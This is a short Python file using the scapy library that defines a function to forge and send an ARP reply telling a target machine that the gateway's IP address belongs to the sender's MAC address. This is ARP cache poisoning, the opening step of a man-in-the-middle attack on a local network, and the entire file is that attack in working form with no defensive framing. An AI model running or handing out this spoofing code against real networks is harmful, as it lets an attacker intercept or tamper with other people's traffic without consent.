from scapy.all import Ether, ARP, sendp


def sendpacket(my_mac, gateway_ip, target_ip, target_mac):
    ether = Ether()
    ether.src = my_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    

    arp = arp
    arp.pdst = target_ip
    arp.hwdst = target_mac

    ether = ether
    ether.src = my_mac
    ether.dst = target_mac

    arp.op = 2

    def broadcastPacket():
        packet = ether / arp
        sendp(x=packet, verbose=False)

    broadcastPacket()
